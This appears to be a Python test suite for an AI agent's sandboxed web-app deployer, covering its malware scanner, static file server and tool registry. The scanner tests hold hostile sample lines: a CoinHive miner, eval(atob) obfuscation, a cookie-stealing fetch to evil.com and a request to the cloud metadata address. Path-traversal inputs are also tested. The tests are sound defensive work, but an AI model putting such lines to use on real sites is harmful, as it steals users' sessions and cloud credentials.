# SPDX-License-Identifier: Apache-2.0
"""Comprehensive Test Suite for Sandboxed WebApp Deployer, Security Scanner & Static Handler."""

import json
import os
from pathlib import Path
import unittest
from unittest.mock import MagicMock, patch

from services.mcp.builtin.webapp_deployer import (
    deploy_local_webapp,
    list_deployed_webapps,
    remove_deployed_webapp,
    _scan_code_safety,
    _sanitize_slug,
    APPS_DIR,
)
from services.appliance_dashboard.webapp_handler import WebAppsHandler, CSP_HEADER
from services.mcp.tool_registry import ToolRegistry
from services.mcp.agent_loop import AgentLoop, format_tool_content_if_json, detect_direct_tool_intent


class TestWebAppDeployerAndSecurity(unittest.TestCase):
    """Verifies security controls, deployment mechanics, and sandbox isolation."""

    def setUp(self):
        self.test_slug = "test-security-game"
        self.test_dir = APPS_DIR / self.test_slug

    def tearDown(self):
        if self.test_dir.exists():
            import shutil
            shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_sanitize_slug(self):
        self.assertEqual(_sanitize_slug("My Awesome Game! 123"), "my-awesome-game-123")
        self.assertEqual(_sanitize_slug("PAC-MAN (Konami)"), "pac-man-konami")
        self.assertEqual(_sanitize_slug("../../../dangerous"), "dangerous")
        self.assertEqual(_sanitize_slug("   "), "webapp")

    def test_scan_code_safety_blocks_malware_patterns(self):
        # Coinhive / Crypto miner
        res_miner = _scan_code_safety(["var miner = new CoinHive.Anonymous('site-key');"])
        self.assertIsNotNone(res_miner)
        self.assertIn("Gefährliches Muster", res_miner)

        # Eval atob obfuscation
        res_eval = _scan_code_safety(["eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='));"])
        self.assertIsNotNone(res_eval)
        self.assertIn("Gefährliches Muster", res_eval)

        # Cookie exfiltration
        res_exfil = _scan_code_safety(["fetch('https://evil.com/steal?c=' + document.cookie);"])
        self.assertIsNotNone(res_exfil)
        self.assertIn("Gefährliches Muster", res_exfil)

        # Cloud metadata IP access
        res_metadata = _scan_code_safety(["fetch('http://169.254.169.254/latest/meta-data/')"])
        self.assertIsNotNone(res_metadata)
        self.assertIn("Gefährliches Muster", res_metadata)

        # Safe code passes
        res_safe = _scan_code_safety(["const canvas = document.getElementById('c'); ctx.fillRect(0,0,10,10);"])
        self.assertIsNone(res_safe)

    def test_deploy_local_webapp_blocks_malicious_code(self):
        res = deploy_local_webapp(
            app_name=self.test_slug,
            title="Malicious Miner",
            html_content="<script>var x = CoinHive.start();</script>",
        )
        self.assertFalse(res.get("success"))
        self.assertIn("error", res)
        self.assertIn("Sicherheitsblockade", res["error"])

    def test_deploy_and_list_and_remove_clean_cycle(self):
        # 1. Deploy
        html = "<html><body><h1>Hello Test Game</h1><script src='app.js'></script></body></html>"
        js = "console.log('Pacman alive');"
        css = "body { background: #000; color: #fff; }"

        res_deploy = deploy_local_webapp(
            app_name=self.test_slug,
            title="Test Security Game",
            html_content=html,
            js_content=js,
            css_content=css,
            description="A test game for security validation",
        )
        self.assertTrue(res_deploy.get("success"))
        self.assertEqual(res_deploy.get("app_name"), self.test_slug)
        self.assertIn("/apps/test-security-game/index.html", res_deploy.get("url_path"))

        # Verify files created on disk
        self.assertTrue((self.test_dir / "index.html").exists())
        self.assertTrue((self.test_dir / "app.js").exists())
        self.assertTrue((self.test_dir / "style.css").exists())
        self.assertTrue((self.test_dir / "app.json").exists())

        # 2. List
        res_list = list_deployed_webapps()
        self.assertTrue(res_list.get("success"))
        names = [a.get("app_name") for a in res_list.get("apps", [])]
        self.assertIn(self.test_slug, names)

        # 3. Remove
        res_remove = remove_deployed_webapp(self.test_slug)
        self.assertTrue(res_remove.get("success"))
        self.assertFalse(self.test_dir.exists())

    def test_pacman_reference_app_is_deployed(self):
        pacman_dir = APPS_DIR / "pacman"
        self.assertTrue(pacman_dir.exists(), "Pac-Man app directory must exist")
        self.assertTrue((pacman_dir / "index.html").exists())
        self.assertTrue((pacman_dir / "game.js").exists())
        self.assertTrue((pacman_dir / "style.css").exists())
        self.assertTrue((pacman_dir / "app.json").exists())

        res_list = list_deployed_webapps()
        names = [a.get("app_name") for a in res_list.get("apps", [])]
        self.assertIn("pacman", names)


class TestWebAppsHandler(unittest.TestCase):
    """Tests static HTTP server routing, MIME types, and path traversal protection."""

    def test_handle_get_non_apps_path(self):
        handler = MagicMock()
        served = WebAppsHandler.handle_get(handler, "/v1/models")
        self.assertFalse(served)

    def test_handle_get_apps_listing_json(self):
        handler = MagicMock()
        served = WebAppsHandler.handle_get(handler, "/apps")
        self.assertTrue(served)
        handler._send_json.assert_called_once()
        args = handler._send_json.call_args[0][0]
        self.assertTrue(args.get("success"))

    def test_handle_get_pacman_index_html(self):
        handler = MagicMock()
        handler.wfile = MagicMock()
        served = WebAppsHandler.handle_get(handler, "/apps/pacman/index.html")
        self.assertTrue(served)
        handler.send_response.assert_called_with(200)
        # Check security headers injected
        headers_sent = [call[0] for call in handler.send_header.call_args_list]
        self.assertIn(("Content-Security-Policy", CSP_HEADER), headers_sent)
        self.assertIn(("X-Content-Type-Options", "nosniff"), headers_sent)

    def test_handle_get_traversal_attack_blocked(self):
        handler = MagicMock()
        # Traversal attempt
        served = WebAppsHandler.handle_get(handler, "/apps/../../config.py")
        self.assertTrue(served)
        # Must be rejected with 403 Forbidden or 404
        self.assertTrue(handler.send_error.called)
        code = handler.send_error.call_args[0][0]
        self.assertIn(code, (403, 404))


class TestRegistryAndAgentLoopIntegration(unittest.TestCase):
    """Tests ToolRegistry registration, intent detection, and Markdown formatting."""

    def setUp(self):
        self.registry = ToolRegistry()
        self.loop = AgentLoop(registry=self.registry)

    def test_webapp_tools_registered(self):
        tools = [t.name for t in self.registry.list_tools()]
        self.assertIn("deploy_local_webapp", tools)
        self.assertIn("list_deployed_webapps", tools)
        self.assertIn("remove_deployed_webapp", tools)
        self.assertIn("launch_deployed_webapp", tools)

    def test_webapp_aliases(self):
        self.assertEqual(self.registry.get_tool("deploy_webapp").name, "deploy_local_webapp")
        self.assertEqual(self.registry.get_tool("create_webapp").name, "deploy_local_webapp")
        self.assertEqual(self.registry.get_tool("list_webapps").name, "list_deployed_webapps")
        self.assertEqual(self.registry.get_tool("delete_webapp").name, "remove_deployed_webapp")
        self.assertEqual(self.registry.get_tool("open_pacman").name, "launch_deployed_webapp")
        self.assertEqual(self.registry.get_tool("play_pacman").name, "launch_deployed_webapp")
        self.assertEqual(self.registry.get_tool("pacman").name, "launch_deployed_webapp")

    def test_list_webapps_intent_detection(self):
        intent = detect_direct_tool_intent("welche webapps sind gehostet", self.registry)
        self.assertIsNotNone(intent)
        self.assertEqual(intent[0], "list_deployed_webapps")

        intent2 = detect_direct_tool_intent("zeige apps", self.registry)
        self.assertIsNotNone(intent2)
        self.assertEqual(intent2[0], "list_deployed_webapps")

    def test_format_tool_content_if_json_deploy(self):
        payload = json.dumps({
            "success": True,
            "app_name": "pacman",
            "title": "Pac-Man Arcade",
            "url_path": "/apps/pacman/index.html",
            "full_local_url": "http://127.0.0.1:8080/apps/pacman/index.html",
            "size_bytes": 12345,
        })
        formatted = format_tool_content_if_json(payload)
        self.assertIn("WebApp Bereitgestellt: **Pac-Man Arcade**", formatted)
        self.assertIn("🎮 **Jetzt Live Starten: Pac-Man Arcade**", formatted)
        self.assertIn("http://127.0.0.1:8080/apps/pacman/index.html", formatted)


if __name__ == "__main__":
    unittest.main()
